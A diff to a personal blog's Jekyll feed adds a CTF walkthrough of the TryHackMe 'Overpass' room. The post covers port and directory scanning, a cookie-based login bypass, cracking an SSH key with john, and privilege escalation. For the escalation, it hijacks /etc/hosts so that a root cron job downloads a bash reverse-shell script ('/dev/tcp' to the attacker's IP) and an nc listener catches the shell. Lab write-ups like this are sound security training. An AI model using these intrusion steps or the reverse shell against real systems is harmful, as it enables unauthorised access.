@@ -1,4 +1,171 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-02-28T01:53:10+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>My website.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe-Gatekeeper</title><link href="http://localhost:4000/post-9/" rel="alternate" type="text/html" title="TryHackMe-Gatekeeper" /><published>2023-02-19T00:00:00+03:00</published><updated>2023-02-19T00:00:00+03:00</updated><id>http://localhost:4000/post-9</id><content type="html" xml:base="http://localhost:4000/post-9/"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-01T04:19:51+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>My website.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">Tryhackme-Overpass</title><link href="http://localhost:4000/tryhackme-overpass/" rel="alternate" type="text/html" title="Tryhackme-Overpass" /><published>2023-03-01T00:00:00+03:00</published><updated>2023-03-01T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-overpass</id><content type="html" xml:base="http://localhost:4000/tryhackme-overpass/"><![CDATA[<p>Overpass is easy room to get you started in CTF’s.</p>
+
+<h2 id="recon">Recon</h2>
+<p>The first thing you will do is scan the target ip address to find open ports. We do it using <strong>Nmap</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$nmap -sSV -v 10.8.81.166
+</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/overpass/nmap.png" alt="nmap" /></p>
+
+<p>As we see here, 2 ports are open. One is HTTP:80 and the other is SSH:22. We can make a few guesses based on this. I think we should somehow find the necessary information for ssh connection from this site. And we have to get into the target machine using ssh. But this is just a guess for now.
+Anyway, let’s go to the website first and see what’s up.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/homepage.png" alt="homepage" /></p>
+
+<p>Overpass bir password manager miş. Ana Sayfada 2 sayfa bağlantısı daha gördük biri “About Us” diğeri “Download” ikisinide inceleyelim.</p>
+
+<h4 id="about-us">About Us</h4>
+<p><img src="/assets/img/tryhackme/overpass/aboutus.png" alt="aboutus" /></p>
+
+<p>Here we see a few names that may be useful to us in the future.</p>
+
+<h4 id="download">Download</h4>
+<p><img src="/assets/img/tryhackme/overpass/download.png" alt="download" /></p>
+
+<p>We see two files here, one is the source code of overpass and the other is the script that runs this code.
+We couldn’t find much, let’s look at the source codes of the pages.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/home_source.png" alt="home" /></p>
+
+<p>This is really fun.
+We couldn’t find anything remarkable in the source code of the About Us and Downloads pages.</p>
+
+<p>Let’s do a gobuster scan to see if there are other pages on the site.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$gobuster dir -u 10.10.79.124 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass/gobuster.png" alt="aboutus" /></p>
+
+<p>We found an interesting place /admin/ page here, let’s examine it.
+I tried a few login attempts first, but it didn’t work.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/admin.png" alt="aboutus" /></p>
+
+<p>Let’s take a look at the source code of the admin page.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/admin_id.png" alt="aboutus" /></p>
+
+<p>Maybe we can brute force using the information here.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/admin_file.png" alt="aboutus" /></p>
+
+<p>And there are several javascript files, let’s examine them.
+The main.js contains nothing but the hello world output.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/main.png" alt="aboutus" /></p>
+
+<p>Let’s examine login.js now.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/login.png" alt="aboutus" /></p>
+
+<p>We found something here. A login function has been placed here. It says that if you enter wrong information, you will get incorrect credentials, but if it is entered correctly, cookie settings will be set as SessionToken and status0Cookie. Let’s try to login using this cookie information.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/settings.png" alt="aboutus" /></p>
+
+<p>After entering the information, we refresh the page and we are inside.
+We come across an SSH key, but there is an article before it.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/admin_on.png" alt="aboutus" /></p>
+
+<p>Paradox was annoyed that James kept forgetting the password. And as punishment, he wrote the password as SSH Key.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/ssh.png" alt="aboutus" /></p>
+
+<p>Let’s find james’ SSH password.
+To crack the password of an rsa key, we need to follow these steps.
+We create id_rsa file using <strong>nano</strong>. Copy and paste the rsa private key information into it. Then we change the permission settings using <strong>chmod</strong> so that ssh can use it.
+Then we use <strong>ssh2john</strong> to bring this ssh key in a way that joh can crack, and then we find the password using <strong>john</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$nano id_rsa
+$chmod 600 id_rsa
+$ssh2john id_rsa &gt; hash.txt
+$john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre></div></div>
+
+<p>And we find the password <strong>james13</strong>
+Now we can connect to james using this information.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ssh -i id_rsa james@10.10.79.124
+</code></pre></div></div>
+
+<p>And we’re inside</p>
+
+<p><img src="/assets/img/tryhackme/overpass/james.png" alt="aboutus" /></p>
+
+<p>Let’s see what’s in james’ folder.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass/ls.png" alt="aboutus" /></p>
+
+<p>There are a few files that caught our attention <strong>todo.txt, user.txt</strong>
+user.txt : user flag</p>
+
+<p><img src="/assets/img/tryhackme/overpass/user_flag.png" alt="aboutus" /></p>
+
+<p>Now let’s take a look at todo.txt.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/todo.png" alt="aboutus" /></p>
+
+<p>Important things are being talked about here. James keeps a password around here, but he said he used his own password manager.
+There was something he wanted to talk to Pardox about. He also says how the build script works automatically in the system.</p>
+
+<p>I examined the files again using <code class="language-plaintext highlighter-rouge">ls -la</code> and there is another file called .overpass, and when I looked inside, I found something like this.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/pass.png" alt="aboutus" /></p>
+
+<p>This must be the password that James mentioned in todo.txt, but we don’t know how he encrypted it. But he told us they did it using their own password manager. So why don’t we go back to the website and examine the source code of the overpass?
+What I noticed when I reviewed the code is this.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/source.png" alt="aboutus" /></p>
+
+<p>The algorithm they use according to the code they wrote is <code class="language-plaintext highlighter-rouge">rotate-47</code></p>
+
+<p><img src="/assets/img/tryhackme/overpass/rot.png" alt="aboutus" /></p>
+
+<p>And here we found a password but I didn’t understand where to put it.</p>
+
+<p>But if we need to go back to todo.txt, James was talking about the continuous and automatic loading of the application there, why don’t we look at the cronjob.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cat /etc/crontab
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass/cron.png" alt="aboutus" /></p>
+
+<p>And here we get important information. As we can see, the root user automatically runs the file overpass.thm/downloads/src/buildscript.sh as <strong>cronjab</strong>.
+In other words, a bash file is running automatically in the system, if we can change this file, we can place our own reverse shell.
+I tried to open and change the file several times, but I couldn’t do anything because it exceeded my authorization limits. But there was one thing I missed, overpass.thm is a hostname and if we manage to change this hostname and enter our own machine information, I can run my own buildscript.sh file.
+For this I first check the contents of /etc/hosts.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/hosts.png" alt="aboutus" /></p>
+
+<p>Interestingly, James has the ability to modify this file.
+Using my own machine ip, I change the overpass.thm line to<code class="language-plaintext highlighter-rouge"> "10.8.81.166 overpass.thm"</code>
+Then I will do the following in order on my own machine. I will create the /downloads/src/buildscript.sh file. And I will write revershell inside this file, then I will open an http.server just outside the downloads folder. At the same time, I will open a listener for nc using the same port as the port I entered in revershell. Then cronjab will connect to my machine and get the downoads/src/buildscript.sh file and then run it. The revershell inside it will also work and boom we’ll go inside.</p>
+
+<p><code class="language-plaintext highlighter-rouge">buildscript.sh:  bash -i &gt;&amp; /dev/tcp/10.8.81.166/4444 &gt;&amp;1</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$mkdir downloads
+$cd downloads
+$mdir src
+$cd src
+$nano buildscript.sh
+$cd ../..
+$python3 -m http.server 80
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444
+</code></pre></div></div>
+<p>We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/overpass/root.png" alt="aboutus" /></p>
+
+<p>And root flag .</p>
+
+<p><img src="/assets/img/tryhackme/overpass/root_flag.png" alt="aboutus" /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security" /><category term="easy" /><category term="cron" /><category term="owasp top 10" /><summary type="html"><![CDATA[Overpass is easy room to get you started in CTF’s.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/overpass.png" /><media:content medium="image" url="http://localhost:4000/assets/img/overpass.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe-Gatekeeper</title><link href="http://localhost:4000/post-9/" rel="alternate" type="text/html" title="TryHackMe-Gatekeeper" /><published>2023-02-19T00:00:00+03:00</published><updated>2023-02-19T00:00:00+03:00</updated><id>http://localhost:4000/post-9</id><content type="html" xml:base="http://localhost:4000/post-9/"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
 
 <p>Jekyll requires blog post files to be named according to the following format:</p>
 
